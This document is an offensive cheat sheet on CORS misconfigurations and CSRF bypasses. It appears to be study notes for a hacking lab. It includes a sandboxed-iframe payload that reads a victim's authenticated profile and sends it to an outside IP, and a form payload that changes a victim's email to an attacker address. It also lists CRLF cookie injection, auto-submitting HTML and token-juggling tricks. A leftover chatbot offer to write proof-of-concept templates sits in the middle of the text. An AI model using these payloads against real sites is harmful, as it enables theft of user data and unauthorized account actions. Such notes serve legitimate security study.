
## 🌐 1. CORS Misconfigurations (Data Theft)
#### CORS Headers

- [Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin): define Same-Origin policy exceptions for a specific origin
- [Access-Control-Expose-Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers): define Same-Origin policy exceptions for specific HTTP headers
- [Access-Control-Allow-Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Methods): define Same-Origin policy exceptions for allowed HTTP methods in response to a preflight request
- [Access-Control-Allow-Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers): define Same-Origin policy exceptions for allowed HTTP headers in response to a preflight request
- [Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials): if set to `true`, define Same-Origin policy exceptions even if the cross-origin request contains credentials, i.e., cookies or an `Authorization` header
- [Access-Control-Max-Age](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Max-Age): define for how long the information in the other CORS-headers can be cached without issuing a new preflight request
- [Access-Control-Request-Method](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Method): inform the server about the HTTP method used in the actual request
- [Access-Control-Request-Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers): inform the server about the HTTP headers used in the actual request

#### Simple Requests vs Preflighted Requests

**Simple Requests**:

- GET or HEAD requests without any custom HTTP headers
- POST requests without any custom HTTP headers and a `Content-Type` of `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`

**Preflighted Requests:**

- All other requests
- A `preflight request` is sent before the actual request
- Web application needs to respond to the preflight request with appropriate CORS headers to signal to the browser that the actual cross-origin request is allowed

CORS vulnerabilities allow you to bypass the **Same-Origin Policy (SOP)** to read sensitive data (API keys, PII, or CSRF tokens).

| **Technique**     | **Server-Side Flaw**     | **Attacker Strategy**                                   |
| ----------------- | ------------------------ | ------------------------------------------------------- |
| **Null Origin**   | Whitelists `null` origin | Use a sandboxed `<iframe>` to force `Origin: null`.     |
| **Suffix Bypass** | Matches `*test.com`      | Register `attack-test.com`.                             |
| **TLD/Subdomain** | Incomplete regex         | Use `test.com.attacker.com` or `attacker.com/test.com`. |
| **Reflection**    | Echoes any `Origin`      | Requires `Access-Control-Allow-Credentials: true`.      |

### **The `null` Origin Payload**

HTML

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/profile.php', true);
    xhr.withCredentials = true; 
    xhr.onload = () => {
        fetch('https://10.10.17.142', {method:'POST', body: btoa(xhr.responseText)});
    };
    xhr.send();
</script>"></iframe>
```

---

## 📝 2. CSRF Bypass Logic (Unauthorized Actions)

### **A. Token & Parameter Juggling**

- **Token Removal:** Delete the `csrf` parameter; some backends skip validation if it is missing.
    
- **Static/Type Bypass:**
    
    - `csrf=0` or `csrf=true`: Exploits loose comparisons (e.g., PHP `0 == "false"`).
        
    - `csrf[]=0`: Sends an **Array** to break string-only validation logic.
        
- **Attacker’s Token:** Use a token from your own valid session. Works if the backend checks token _validity_ but not _ownership_.
    

### **B. Protocol & Method Bypasses**

- **Method Swapping:** Convert `POST` to `GET`.
    
- **`_method` Override:** Add `?_method=POST` to a `GET` request to trick frameworks like Laravel/Rails.
    
- **Content-Type Manipulation:**
    
    - Change `application/json` to `text/plain` to avoid CORS preflights.
        
    - Use `<form enctype="multipart/form-data">` to bypass WAFs looking for standard form encoding.
        

---

## 🧬 3. Advanced Chaining & JSON Attacks

### **🔗 CORS-to-CSRF (The Atomic Chain)**

Used when CSRF is strong but CORS is weak. Must be "Atomic" (one script) to prevent token expiration/consumption by the victim.

1. **Scrape:** Use CORS XHR to fetch the target page and its CSRF token.
    
2. **Execute:** Immediately `POST` the malicious action using that token.
    

### **⚔️ XSS-to-CSRF (The SameSite=Strict Killer)**

When cookies are `SameSite=Strict`, traditional CSRF fails. Use XSS on the target domain to trigger the request. Since it is **Same-Origin**, the `Strict` cookie is sent.

### **📦 JSON-Based CSRF**

If a server expects JSON but doesn't strictly validate the `Content-Type` header:

- **The "Dummy Key" Trick:** Use `enctype="text/plain"` in an HTML form to forge a JSON body.
    

HTML

```
<form action="https://victim.com/api" method="POST" enctype="text/plain">
    <input name='{"email":"hacker@evil.com","ignore":"' value='"}'>
</form>
```

---

## 🏹 4. Delivery & Delivery Methods

### **Cookie Handling**

- **SameSite=Lax Bypass:** Triggered via top-level `GET`. Use `window.location` or `<a href="...">`.
    
- **CRLF Injection:** Inject `%0d%0aSet-Cookie: csrf=12345` to "fix" a token you already know for a Double Submit Cookie bypass.
    

### **Redirect-Based CSRF**

- **Open Redirect:** Use `victim.com/redirect?url=...` to bypass `Referer` checks; the request appears to originate from the trusted domain.
    
- **Path Traversal:** Abuse redirect params like `postId=../../change-email?email=...`.
    

### **Auto-Execution**

- **Meta Refresh:** `<meta http-equiv="refresh" content="0;url=https://target.com/api?action=delete">`
    
- **Image Error:** `<img src=x onerror="document.forms[0].submit()">`
    

---

## 🕵️ Quick Recon Checklist

- [ ] Check `Origin: null` via sandboxed iframe.
    
- [ ] Try `csrf=0`, `csrf[]=` or removing the token entirely.
    
- [ ] Attempt to convert `POST` to `GET` for sensitive actions.
    
- [ ] Test if the API accepts `text/plain` instead of `application/json`.
    
- [ ] If `SameSite=Strict` is active, hunt for XSS to perform the CSRF.
    

**Would you like me to create a specific proof-of-concept template for any of these individual techniques?**

## New Tricks

### Trick 1
- Scenario: State-changing JSON endpoint accepted cross-site simple POST form.
- Payload: `<form action="https://target.com/api/email" method="POST"><input name="email" value="pwn@attacker.tld"></form>`

### Trick 2
- Scenario: CSRF token validated but not bound to user session.
- Payload: `reuse token from account A in account B request`

### Trick 3
- Scenario: SameSite=Lax bypassed through top-level GET state change endpoint.
- Payload: `GET /account/delete?confirm=1`
